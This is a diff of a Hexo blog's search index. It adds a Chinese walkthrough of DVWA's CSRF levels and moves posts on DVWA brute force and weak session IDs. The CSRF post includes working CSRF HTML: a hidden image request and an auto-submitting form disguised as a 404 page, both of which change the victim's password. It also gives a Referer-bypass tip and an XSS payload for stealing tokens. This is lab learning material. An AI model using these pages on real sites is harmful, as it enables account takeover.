+<p>参考链接：<a href="https://www.cnblogs.com/linfangnan/p/13714694.htm">https://www.cnblogs.com/linfangnan/p/13714694.htm</a></p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -581,6 +524,63 @@
       </tags>
   </entry>
   <entry>
+    <title>dvwa-csrf</title>
+    <url>/2021/02/11/dvwa-csrf/</url>
+    <content><![CDATA[<h1 id="WHAT’S-CSRF"><a href="#WHAT’S-CSRF" class="headerlink" title="WHAT’S CSRF?"></a>WHAT’S CSRF?</h1><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，也被称为one-click attack或者session riding，是一种挟制用户在当前已登录的<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=159605&ss_c=ssc.citiao.link">Web应用程序</a>上执行非本意的操作的攻击方法。</p>
+<p>它通过伪装来自受信任用户的请求来利用受信任的网站。</p>
+<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><p>首先我们构造一个链接，大概像这样</p>
+<p><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p>
+<p><del>（这明眼人都看得出来在改密码吧）</del></p>
+<p>但是如果有这么个没认真看的非酋，在他已经在浏览器登录了，然后还点了这个链接，<del>那就只能恭喜他，他</del>号<del>没</del>了~~</p>
+<p>但是（对，就是还有一个但是）这个前提必须要是同一个浏览器才行，cookie不能跨浏览器使用，那如果换了一个浏览器打开呢，那也只是会返回到登录界面</p>
+<p>那不如考虑把链接改造一下，比如生成短链接</p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210212102104168.png"></p>
+<p>（本地网址不支持）</p>
+<p>这看起来还不太一样，缩短链接试试</p>
+<p>但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p>
+<p>在网上看到了写页面的方法<a href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是我这里运行的并不成功</p>
+<p>不如换一种写法</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ls<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br>&#123;<br><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;submit&quot;</span>).submit();</span><br>&#125;<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>= <span class="hljs-string">&quot;http://192.168.1.104/dvwa/vulnerabilities/csrf&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;submit&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot; password new&quot;</span> <span class="hljs-attr">value</span>= <span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>= <span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/02/11/dvwa-csrf/image-20210224124255265.png"></p>
+<p>但是这种方法，会返回到修改成功的界面上来</p>
+<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><p>来看看源码</p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210214193706473.png"></p>
+<p>和low不同的是，多了第5行</p>
+<p>检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数以及要访问的主机名）</p>
+<p>来抓包看看</p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210224125742537.png"></p>
+<p>也就是说只要http包头的Referer参数的值中包含主机名，即可绕过</p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210224135559394.png"></p>
+<p>在光标后面添加主机名的html即可成功，（我这里是对钓鱼网页进行抓包后修改）</p>
+<p>也可以用x-forward-for修改referer</p>
+<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><p>从源码得知，我们需要token</p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210224140222667.png"></p>
+<p>利用xssstored，来获取token</p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210224140625228.png"></p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210224144743262.png"></p>
+<p>然后我有了一个想法</p>
+<p><img src="/2021/02/11/dvwa-csrf/image-20210225164309546.png"></p>
+<p>利用短链接注入在xss漏洞中，引诱受害者点击该链接，即可实现改密</p>
+<p><a href="http://192.168.1.104/dvwa/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change&amp;user_token=">http://192.168.1.104/dvwa/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change&amp;user_token=</a>&lt;iframe src=”../csrf”onload=alert(frames[0].document.getElementsByName(‘user_token’)[0].value)# </p>
+<p>但是后半段的代码并不能成为网页的一部分，失败尝试+1 </p>
+<p>从理论上说我们可以写一个攻击代码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><br>  &#123;<br><br><span class="javascript">   <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><br><span class="javascript">  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit(); </span><br><br>  &#125;<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>但是，理想和现实，差距甚远。这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是<a href="http://192.168.153.130/dvwa/vulnerabilities/csrf%EF%BC%8C%E4%BD%8D%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8192.168.153.130%E4%B8%8A%EF%BC%8C%E8%80%8C%E6%88%91%E4%BB%AC%E7%9A%84%E6%94%BB%E5%87%BB%E9%A1%B5%E9%9D%A2%E4%BD%8D%E4%BA%8E%E9%BB%91%E5%AE%A2%E6%9C%8D%E5%8A%A1%E5%99%A810.4.253.2%E4%B8%8A%EF%BC%8C%E4%B8%A4%E8%80%85%E7%9A%84%E5%9F%9F%E5%90%8D%E4%B8%8D%E5%90%8C%EF%BC%8C%E5%9F%9F%E5%90%8DB%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2%E9%83%BD%E4%B8%8D%E5%85%81%E8%AE%B8%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%90%8DA%E4%B8%8B%E7%9A%84%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9%EF%BC%8C%E9%99%A4%E9%9D%9E%E5%9F%9F%E5%90%8DA%E4%B8%8B%E7%9A%84%E9%A1%B5%E9%9D%A2%E4%B8%BB%E5%8A%A8%E5%8F%91%E9%80%81%E4%BF%A1%E6%81%AF%E7%BB%99%E5%9F%9F%E5%90%8DB%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E7%9A%84%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E6%98%AF%E4%B8%8D%E5%8F%AF%E8%83%BD%E5%8F%96%E5%88%B0%E6%94%B9%E5%AF%86%E7%95%8C%E9%9D%A2%E4%B8%AD%E7%9A%84user_token%E3%80%82">http://192.168.153.130/dvwa/vulnerabilities/csrf，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</a></p>
+<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><p>这个要求原密码，就没什么办法了吧。</p>
+<p>参考链接：</p>
+<p><a href="https://blog.csdn.net/manok/article/details/103552937">https://blog.csdn.net/manok/article/details/103552937</a></p>
+<p><a href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dvwa-sql(blind)</title>
     <url>/2021/02/13/dvwa-sql-blind/</url>
     <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>看看源代码，这里不支持报错注入，那看来只能用布尔和延时注入了</p>
@@ -590,39 +590,6 @@
 <h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>界面同sql-medium ，抓个包即可进行布尔和延时注入。</p>
 <h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>看了源码后发现，延时注入受到影响，使用布尔注入，打法同low，源码的设置与sql-high的相似。</p>
 <h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>还是PDO和Anti-CSRFtoken组合的方式，来提高安全性。</p>
-]]></content>
-      <tags>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa-weak session ids</title>
-    <url>/2021/02/16/dvwa-weak-session-ids/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>weak session， 弱对话</p>
-<p>如果会话 ID 可以计算或很容易猜到的话，通常只需要，这样攻击者就可以利用知道会话 ID 轻松地访问用户帐户，而不必强行使用密码或发现其他漏洞，如跨站点脚本 (XSS)。</p>
-<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>抓包就对了</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163833001.png"></p>
-<p>通过hackbar，</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163922045.png"></p>
-<p>即可登录会话</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164030199.png"></p>
-<p>这边的id数依次加一</p>
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>和low相似</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164257040.png"></p>
-<p>dvwasession换成了时间戳 </p>
-<p>分享一个时间轴在线工具<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164752418.png"></p>
-<p>感觉和medium蛮像的</p>
-<p>不如把这几个的源代码来比较一下</p>
-<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216170006067.png"></p>
-<p>(⊙﹏⊙)事实上，high的代码只比low的多了MD5加密</p>
-<p>但是我这里无论怎么抓包结果都是上上张图</p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216171414785.png"></p>
-<p>来看看源码</p>
-<p><strong>使用了PHP setcookie()函数，来设置cookie:</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">setcookie(name,value,expire,path,domain,secure,httponly)<br><br><br><br> 参数 	             描述<br><br><br><br>name 	    必需。规定cookie的名称。<br><br><br><br>value 	    必需。规定cookie的值。<br><br><br><br>expire   	可选。规定cookie的有效期。<br><br><br><br>path 	    可选。规定cookie的服务器路径。<br><br><br><br>domain 	    可选。规定cookie的域名。<br><br><br><br>secure 	    可选。规定是否通过安全的HTTPS连接来传输cookie。<br><br><br><br>httponly 	可选。规定是否Cookie仅可通过HTTP协议访问。<br></code></pre></td></tr></table></figure>
-
-<p><strong>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</strong></p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -662,35 +629,33 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-暴力破解</title>
-    <url>/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>来看看源码</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132533183.png"></p>
-<p>可以说是什么防护措施都没有了，虽然说这里是暴力破解，但是我觉得sql注入也是可以的，那就试一下</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211124758657.png"></p>
-<p>这里密码随意输入即可成功，但很有意思的事，这个前提条件是网址为127.0.0.1才行，用本机ip地址并不成功</p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>也可以用brupsuite进行爆破</p>
-<p>先来抓个包吧</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211131651289.png"></p>
-<p>然后选好密码字典进行爆破（如果字典选不好的话，就爆破不了了或者是爆破时间相当的长）</p>
-<h1 id="midumn"><a href="#midumn" class="headerlink" title="midumn"></a>midumn</h1><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132834686.png"></p>
-<p>相比low的明显就有了变化</p>
-<p>mysql_real_escape_string(),这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，因此这里不能在进行sql注入</p>
-<p>但是在这里依然可以用brupsuite进行爆破，方法同low</p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>在medium的基础上，增加了stripslashes( )函数删除由 addslashes() 函数添加的反斜杠,如果有两个连续的反斜线,则只去掉一个。、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
-<p>看看还增加了什么，token而且还是在登陆时随机产生的，且优先级高于sql查询，那直接爆破的话看起来是不行了</p>
-<p>这边的爆破方法我参考了这篇文章 <a href="https://blog.csdn.net/m0_46432705/article/details/106364716">https://blog.csdn.net/m0_46432705/article/details/106364716</a></p>
-<p>但是token没有复制成功去查了一下发现</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211142953061.png"></p>
-<p>我原来这边的设置是never，所以无法实现服务器返回的token</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211143415491.png"></p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210212223913790.png"><span class="image-caption">image-20210212223913790</span></p>
-<p>找找返回长度不同的，试一下就知道密码了<del>（手动滑稽</del></p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>看了一下和high的源代码蛮像的</p>
-<p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p>
-<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211144228923.png"></p>
-<p>然后还多了个</p>
-<p>这是因为不能使用PDO扩展本身执行任何数据库操作，从而阻止破坏sql语句结构执行恶意的sql命令。</p>
+    <title>dvwa-weak session ids</title>
+    <url>/2021/02/16/dvwa-weak-session-ids/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>weak session， 弱对话</p>
+<p>如果会话 ID 可以计算或很容易猜到的话，通常只需要，这样攻击者就可以利用知道会话 ID 轻松地访问用户帐户，而不必强行使用密码或发现其他漏洞，如跨站点脚本 (XSS)。</p>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>抓包就对了</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163833001.png"></p>
+<p>通过hackbar，</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216163922045.png"></p>
+<p>即可登录会话</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164030199.png"></p>
+<p>这边的id数依次加一</p>
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>和low相似</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164257040.png"></p>
+<p>dvwasession换成了时间戳 </p>
+<p>分享一个时间轴在线工具<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216164752418.png"></p>
+<p>感觉和medium蛮像的</p>
+<p>不如把这几个的源代码来比较一下</p>
+<p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216170006067.png"></p>
+<p>(⊙﹏⊙)事实上，high的代码只比low的多了MD5加密</p>
+<p>但是我这里无论怎么抓包结果都是上上张图</p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p><img src="/2021/02/16/dvwa-weak-session-ids/image-20210216171414785.png"></p>
+<p>来看看源码</p>
+<p><strong>使用了PHP setcookie()函数，来设置cookie:</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">setcookie(name,value,expire,path,domain,secure,httponly)<br><br><br><br> 参数 	             描述<br><br><br><br>name 	    必需。规定cookie的名称。<br><br><br><br>value 	    必需。规定cookie的值。<br><br><br><br>expire   	可选。规定cookie的有效期。<br><br><br><br>path 	    可选。规定cookie的服务器路径。<br><br><br><br>domain 	    可选。规定cookie的域名。<br><br><br><br>secure 	    可选。规定是否通过安全的HTTPS连接来传输cookie。<br><br><br><br>httponly 	可选。规定是否Cookie仅可通过HTTP协议访问。<br></code></pre></td></tr></table></figure>
+
+<p><strong>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</strong></p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -827,6 +792,41 @@
       </tags>
   </entry>
   <entry>
+    <title>dvwa-暴力破解</title>
+    <url>/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>来看看源码</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132533183.png"></p>
+<p>可以说是什么防护措施都没有了，虽然说这里是暴力破解，但是我觉得sql注入也是可以的，那就试一下</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211124758657.png"></p>
+<p>这里密码随意输入即可成功，但很有意思的事，这个前提条件是网址为127.0.0.1才行，用本机ip地址并不成功</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>也可以用brupsuite进行爆破</p>
+<p>先来抓个包吧</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211131651289.png"></p>
+<p>然后选好密码字典进行爆破（如果字典选不好的话，就爆破不了了或者是爆破时间相当的长）</p>
+<h1 id="midumn"><a href="#midumn" class="headerlink" title="midumn"></a>midumn</h1><p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211132834686.png"></p>
+<p>相比low的明显就有了变化</p>
+<p>mysql_real_escape_string(),这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，因此这里不能在进行sql注入</p>
+<p>但是在这里依然可以用brupsuite进行爆破，方法同low</p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>在medium的基础上，增加了stripslashes( )函数删除由 addslashes() 函数添加的反斜杠,如果有两个连续的反斜线,则只去掉一个。、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
+<p>看看还增加了什么，token而且还是在登陆时随机产生的，且优先级高于sql查询，那直接爆破的话看起来是不行了</p>
+<p>这边的爆破方法我参考了这篇文章 <a href="https://blog.csdn.net/m0_46432705/article/details/106364716">https://blog.csdn.net/m0_46432705/article/details/106364716</a></p>
+<p>但是token没有复制成功去查了一下发现</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211142953061.png"></p>
+<p>我原来这边的设置是never，所以无法实现服务器返回的token</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211143415491.png"></p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210212223913790.png"><span class="image-caption">image-20210212223913790</span></p>
+<p>找找返回长度不同的，试一下就知道密码了<del>（手动滑稽</del></p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>看了一下和high的源代码蛮像的</p>
+<p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p>
+<p><img src="/2021/02/02/dvwa-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20210211144228923.png"></p>
+<p>然后还多了个</p>
+<p>这是因为不能使用PDO扩展本身执行任何数据库操作，从而阻止破坏sql语句结构执行恶意的sql命令。</p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2020/10/02/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -901,6 +901,19 @@
       </tags>
   </entry>
   <entry>
+    <title>猜数字</title>
+    <url>/2020/10/02/my-first-blog/</url>
+    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code> 通过导入python预设随机数模块，设计两个猜数字游戏（1~10），一个猜单次，一个猜多次。</code></pre>
+<h3 id="单次"><a href="#单次" class="headerlink" title="单次"></a>单次</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">import random<br><span class="hljs-comment">#在1到10之间的一个整数</span><br>number=random.randint(1,10)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我在想一个1到10之间的整数&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;猜猜看，这个数字是：&#x27;</span>)<br>guess=int(input())<br><span class="hljs-keyword">if</span> guess==number:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;恭喜你，猜对了！&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;很遗憾，你猜错了。&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
